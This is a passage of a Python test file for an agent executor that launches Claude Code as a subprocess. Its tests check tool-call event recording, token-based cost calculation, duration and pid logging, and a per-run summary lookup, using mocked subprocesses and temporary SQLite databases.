            {"type": "tool_use", "id": "x", "name": "Bash"},
            None, pending,
        )
        assert result == []

    def test_multiple_tool_calls_all_recorded(self):
        """Three tool_use / tool_result pairs produce three rows."""
        from agent import executor_runs_db

        run_id = executor_runs_db.record_run(status="running")
        pending: dict = {}
        for i, name in enumerate(["Bash", "Edit", "Read"]):
            use_id = f"toolu_{i}"
            record_tool_events(
                {"type": "tool_use", "id": use_id, "name": name},
                run_id, pending,
            )
            record_tool_events(
                {"type": "tool_result", "tool_use_id": use_id,
                 "is_error": False, "content": "ok"},
                run_id, pending,
            )

        rows = executor_runs_db.get_tool_calls(run_id)
        assert [r["tool_name"] for r in rows] == ["Bash", "Edit", "Read"]
        assert all(r["ok"] == 1 for r in rows)

    def test_total_duration_within_5pct_of_run_wallclock(self):
        """Acceptance: summed per-tool duration is within 5% of run duration."""
        from agent import executor_runs_db

        run_start = _time.monotonic()
        run_id = executor_runs_db.record_run(status="running")
        pending: dict = {}

        for i in range(3):
            use_id = f"toolu_{i}"
            record_tool_events(
                {"type": "tool_use", "id": use_id, "name": f"T{i}"},
                run_id, pending,
            )
            _time.sleep(0.05)  # ~50ms of work per tool
            record_tool_events(
                {"type": "tool_result", "tool_use_id": use_id,
                 "is_error": False},
                run_id, pending,
            )

        run_duration_ms = int((_time.monotonic() - run_start) * 1000)
        rows = executor_runs_db.get_tool_calls(run_id)
        summed_ms = sum(r["duration_ms"] for r in rows)
        # Tool durations together should be ≤ run duration, and at least
        # half of it (tools were the dominant work).
        assert summed_ms <= run_duration_ms
        assert summed_ms >= run_duration_ms * 0.5

    def test_malformed_event_does_not_raise(self):
        """Non-dict inputs and unknown shapes silently do nothing."""
        from agent import executor_runs_db

        run_id = executor_runs_db.record_run(status="running")
        pending: dict = {}
        record_tool_events("not a dict", run_id, pending)  # type: ignore[arg-type]
        record_tool_events({"random": "junk"}, run_id, pending)
        record_tool_events({"type": "tool_use"}, run_id, pending)  # no id
        assert executor_runs_db.get_tool_calls(run_id) == []

    def test_tool_result_without_pending_is_ignored(self):
        """A stray tool_result without its tool_use partner is dropped."""
        from agent import executor_runs_db

        run_id = executor_runs_db.record_run(status="running")
        pending: dict = {}
        record_tool_events(
            {"type": "tool_result", "tool_use_id": "ghost", "is_error": False},
            run_id, pending,
        )
        assert executor_runs_db.get_tool_calls(run_id) == []


# =============================================================================
# TK-442 — Cost and duration recorded on every executor run
# =============================================================================


class TestCostCalculation:
    """Unit-level: the rate table produces the expected USD figures."""

    def test_rates_for_all_required_models(self):
        """Three model ids named in the spec must be in MODEL_RATES."""
        for model in (
            "claude-opus-4-6",
            "claude-sonnet-4-6",
            "claude-haiku-4-5-20251001",
        ):
            assert model in MODEL_RATES
            rates = MODEL_RATES[model]
            for key in ("input", "output", "cache_read", "cache_write"):
                assert key in rates
                assert rates[key] > 0

    def test_calculate_cost_sonnet(self):
        """Hand-computed Sonnet check — $3/M in + $15/M out."""
        # 1,000,000 input + 500,000 output → $3 + $7.50 = $10.50
        cost = _calculate_cost_usd(
            input_tokens=1_000_000,
            output_tokens=500_000,
            model="claude-sonnet-4-6",
        )
        assert cost == pytest.approx(10.50, abs=1e-9)

    def test_calculate_cost_with_cache(self):
        """Cache read ($0.30/M) and cache write ($3.75/M) on Sonnet."""
        cost = _calculate_cost_usd(
            cache_read_tokens=1_000_000,
            cache_write_tokens=1_000_000,
            model="claude-sonnet-4-6",
        )
        assert cost == pytest.approx(4.05, abs=1e-9)

    def test_unknown_model_falls_back_to_default(self):
        """Unknown model uses the default rate — never NaN or crash."""
        unknown = _calculate_cost_usd(
            input_tokens=1_000_000, model="future-model-xyz"
        )
        default = _calculate_cost_usd(
            input_tokens=1_000_000, model=DEFAULT_EXECUTOR_MODEL
        )
        assert unknown == default

    def test_cost_from_usage_dict_claude_code_fields(self):
        """Pricing pulls from Anthropic's canonical usage field names."""
        usage = {
            "input_tokens": 100,
            "output_tokens": 50,
            "cache_read_input_tokens": 200,
            "cache_creation_input_tokens": 30,
        }
        expected = _calculate_cost_usd(
            input_tokens=100,
            output_tokens=50,
            cache_read_tokens=200,
            cache_write_tokens=30,
            model="claude-sonnet-4-6",
        )
        assert _cost_from_usage_dict(usage, "claude-sonnet-4-6") == pytest.approx(
            expected, abs=1e-12
        )

    def test_cost_from_usage_dict_missing_fields_treated_as_zero(self):
        """Partial usage dicts (some keys missing) default missing to 0."""
        cost = _cost_from_usage_dict({"input_tokens": 100}, "claude-sonnet-4-6")
        # Only input_tokens contributes — 100 * 3.00 / 1_000_000
        assert cost == pytest.approx(100 * 3.00 / 1_000_000, abs=1e-12)

    def test_cost_from_usage_dict_non_dict_returns_zero(self):
        """Non-dict input must not raise — critical for timeout/error paths."""
        assert _cost_from_usage_dict(None) == 0.0
        assert _cost_from_usage_dict("a string") == 0.0
        assert _cost_from_usage_dict(42) == 0.0

    def test_sum_turn_costs_multiple_turns(self):
        """sum_turn_costs adds per-turn dicts into a single total."""
        turns = [
            {"input_tokens": 100, "output_tokens": 50},
            {"input_tokens": 200, "output_tokens": 75},
        ]
        total = sum_turn_costs(turns, "claude-sonnet-4-6")
        # Turn 1: (100*3 + 50*15) / 1M = 1050 / 1M
        # Turn 2: (200*3 + 75*15) / 1M = 1725 / 1M
        expected = (100 * 3.00 + 50 * 15.00 + 200 * 3.00 + 75 * 15.00) / 1_000_000
        assert total == pytest.approx(expected, abs=1e-12)

    def test_sum_turn_costs_empty_list(self):
        assert sum_turn_costs([]) == 0.0


class TestRunClaudeCodeRecordsCostAndDuration:
    """Integration-ish: mock subprocess, verify DB fields land correctly."""

    @pytest.mark.asyncio
    async def test_two_turn_run_stores_expected_cost(self, monkeypatch):
        """A two-turn run with known tokens produces the expected dollar cost.

        Claude Code's ``--output-format json`` aggregates per-turn usage into
        one block. The test feeds token counts that represent a two-turn run
        (first turn: cached read + small output; second turn: new input +
        larger output) and asserts the recorded cost sums per our rate table.
        """
        import agent.claude_code_runner as runner

        db_records: list[dict] = []

        def fake_record(**fields):
            db_records.append(dict(fields))
            return 1

        monkeypatch.setattr(runner.executor_runs_db, "record_run", fake_record)
        monkeypatch.setattr(runner.executor_runs_db, "archive_run",
                            lambda *a, **k: None)
        monkeypatch.setattr(runner, "_detect_branch", lambda cwd: "test-branch")

        # Two turns aggregated. Individual turns for pedagogy:
        #   Turn 1: in=100, out=50,  cache_read=1_000, cache_write=0
        #   Turn 2: in=300, out=250, cache_read=0,     cache_write=500
        # Aggregated: in=400, out=300, cache_read=1_000, cache_write=500
        aggregated_usage = {
            "input_tokens": 400,
            "output_tokens": 300,
            "cache_read_input_tokens": 1_000,
            "cache_creation_input_tokens": 500,
        }
        payload = json.dumps({
            "result": "task done",
            "session_id": "s-1",
            "num_turns": 2,
            "model": "claude-sonnet-4-6",
            "total_cost_usd": 0.99,  # Claude's estimate — we compute our own
            "usage": aggregated_usage,
        }).encode("utf-8")

        proc = _make_async_proc(returncode=0, stdout=payload)
        with patch(
            "agent.claude_code_runner._find_claude_binary",
            return_value=Path("/fake/claude"),
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                success, output, duration = await runner.run_claude_code(
                    "do two things", jira_key="TK-442"
                )

        assert success is True
        assert output == "task done"

        # Expected cost via Sonnet rates:
        #   (400*3 + 300*15 + 1000*0.30 + 500*3.75) / 1_000_000
        #   = (1200 + 4500 + 300 + 1875) / 1_000_000
        #   = 7875 / 1_000_000 = 0.007875
        # This is equivalent to summing per-turn costs:
        turn_1 = _calculate_cost_usd(
            input_tokens=100, output_tokens=50,
            cache_read_tokens=1_000, cache_write_tokens=0,
            model="claude-sonnet-4-6",
        )
        turn_2 = _calculate_cost_usd(
            input_tokens=300, output_tokens=250,
            cache_read_tokens=0, cache_write_tokens=500,
            model="claude-sonnet-4-6",
        )
        expected_sum = turn_1 + turn_2

        success_rows = [r for r in db_records if r.get("status") == "success"]
        assert len(success_rows) == 1
        assert success_rows[0]["cost_usd"] == pytest.approx(expected_sum, abs=1e-6)
        assert success_rows[0]["duration_ms"] is not None
        assert success_rows[0]["duration_ms"] >= 0

    @pytest.mark.asyncio
    async def test_mid_execution_exception_records_duration_and_cost(
        self, monkeypatch
    ):
        """If spawn raises, duration_ms and cost_usd (=0) are still recorded."""
        import agent.claude_code_runner as runner

        db_records: list[dict] = []

        def fake_record(**fields):
            db_records.append(dict(fields))
            return 1

        monkeypatch.setattr(runner.executor_runs_db, "record_run", fake_record)

        with patch(
            "agent.claude_code_runner._find_claude_binary",
            return_value=Path("/fake/claude"),
        ):
            with patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=RuntimeError("boom mid-run")),
            ):
                success, output, duration = await runner.run_claude_code(
                    "explode", jira_key="TK-442"
                )

        assert success is False
        assert "boom mid-run" in output

        error_rows = [r for r in db_records if r.get("status") == "error"]
        assert len(error_rows) == 1
        # Both fields populated — not null
        assert "cost_usd" in error_rows[0]
        assert error_rows[0]["cost_usd"] == pytest.approx(0.0)
        assert "duration_ms" in error_rows[0]
        assert error_rows[0]["duration_ms"] >= 0

    @pytest.mark.asyncio
    async def test_failure_path_still_records_cost_and_duration(
        self, monkeypatch
    ):
        """A non-zero exit code still gets cost_usd + duration_ms."""
        import agent.claude_code_runner as runner

        db_records: list[dict] = []

        def fake_record(**fields):
            db_records.append(dict(fields))
            return 1

        monkeypatch.setattr(runner.executor_runs_db, "record_run", fake_record)
        monkeypatch.setattr(runner.executor_runs_db, "archive_run",
                            lambda *a, **k: None)
        monkeypatch.setattr(runner, "_detect_branch", lambda cwd: None)

        payload = json.dumps({
            "result": "partial",
            "model": "claude-sonnet-4-6",
            "usage": {"input_tokens": 50, "output_tokens": 25},
        }).encode("utf-8")
        proc = _make_async_proc(returncode=3, stdout=payload, stderr=b"fail")

        with patch(
            "agent.claude_code_runner._find_claude_binary",
            return_value=Path("/fake/claude"),
        ):
            with patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)):
                success, output, duration = await runner.run_claude_code(
                    "task", jira_key="TK-442"
                )

        assert success is False
        failure_rows = [r for r in db_records if r.get("status") == "failure"]
        assert len(failure_rows) == 1
        expected = _calculate_cost_usd(
            input_tokens=50, output_tokens=25, model="claude-sonnet-4-6"
        )
        assert failure_rows[0]["cost_usd"] == pytest.approx(expected, abs=1e-9)
        assert failure_rows[0]["duration_ms"] >= 0

    @pytest.mark.asyncio
    async def test_binary_not_found_records_zero_cost(self, monkeypatch):
        """Missing binary: cost=0, duration=0, status=binary_not_found."""
        import agent.claude_code_runner as runner

        db_records: list[dict] = []
        monkeypatch.setattr(
            runner.executor_runs_db, "record_run",
            lambda **f: (db_records.append(dict(f)) or 1),
        )

        with patch("agent.claude_code_runner._find_claude_binary", return_value=None):
            await runner.run_claude_code("x", jira_key="TK-442")

        bnf = [r for r in db_records if r.get("status") == "binary_not_found"]
        assert len(bnf) == 1
        assert bnf[0]["cost_usd"] == 0.0
        assert bnf[0]["duration_ms"] == 0


class TestRunClaudeCodeRecordsPid:
    """TK-492 — record subprocess pid on the executor run row after spawn."""

    @pytest.mark.asyncio
    async def test_pid_recorded_after_spawn(self, monkeypatch):
        """The fake proc's .pid must land in an executor_runs_db.record_run call."""
        import agent.claude_code_runner as runner

        db_records: list[dict] = []

        def fake_record(**fields):
            db_records.append(dict(fields))
            return 42  # stable db_id so the update-with-pid path keys off it

        monkeypatch.setattr(runner.executor_runs_db, "record_run", fake_record)
        monkeypatch.setattr(
            runner.executor_runs_db, "archive_run", lambda *a, **k: None
        )
        monkeypatch.setattr(runner, "_detect_branch", lambda cwd: None)

        expected_pid = 987654
        proc = _make_async_proc(returncode=0, stdout=b'{"result": "ok"}')
        proc.pid = expected_pid

        with patch(
            "agent.claude_code_runner._find_claude_binary",
            return_value=Path("/fake/claude"),
        ):
            with patch(
                "asyncio.create_subprocess_exec", AsyncMock(return_value=proc)
            ):
                await runner.run_claude_code("task", jira_key="TK-492")

        pid_calls = [
            r for r in db_records
            if r.get("pid") == expected_pid and r.get("id") == 42
        ]
        assert len(pid_calls) == 1, (
            f"Expected one record_run(id=42, pid={expected_pid}) call, "
            f"got records={db_records}"
        )


class TestExecutorRunSummary:
    """executor_run_summary helper returns the four-field summary dict."""

    @pytest.fixture(autouse=True)
    def _isolate_db(self, tmp_path, monkeypatch):
        from agent import executor_runs_db

        db_path = tmp_path / "executor_runs.db"
        monkeypatch.setattr(executor_runs_db, "DB_DIR", tmp_path)
        monkeypatch.setattr(executor_runs_db, "DB_PATH", db_path)
        executor_runs_db._local.__dict__.pop("conn", None)
        executor_runs_db.init_db()
        yield
        conn = getattr(executor_runs_db._local, "conn", None)
        if conn:
            conn.close()
            executor_runs_db._local.conn = None

    def test_returns_expected_keys_for_known_id(self):
        from agent import executor_runs_db

        run_id = executor_runs_db.record_run(
            run_id="20260416-120000-TK-442",
            jira_key="TK-442",
            status="success",
            duration_ms=12_500,
            cost_usd=0.0425,
        )
        summary = executor_runs_db.executor_run_summary(run_id)
        assert set(summary.keys()) == {
            "cost_usd", "duration_ms", "status", "story_key",
        }
        assert summary["cost_usd"] == pytest.approx(0.0425)
        assert summary["duration_ms"] == 12_500
        assert summary["status"] == "success"
        assert summary["story_key"] == "TK-442"

    def test_lookup_by_artifact_run_id_string(self):
        """Callers may pass the sortable artifact run_id instead of the row id."""
        from agent import executor_runs_db

        executor_runs_db.record_run(
            run_id="20260416-140000-TK-501",
            jira_key="TK-501",
            status="timeout",
            duration_ms=900_000,
            cost_usd=0.12,
        )
        summary = executor_runs_db.executor_run_summary("20260416-140000-TK-501")
        assert summary["story_key"] == "TK-501"
        assert summary["status"] == "timeout"
        assert summary["cost_usd"] == pytest.approx(0.12)

    def test_unknown_run_id_raises_key_error(self):
        from agent import executor_runs_db

        with pytest.raises(KeyError):
            executor_runs_db.executor_run_summary(99999)

    def test_unknown_artifact_run_id_raises_key_error(self):
        from agent import executor_runs_db

        with pytest.raises(KeyError):
            executor_runs_db.executor_run_summary("never-existed-run-id")
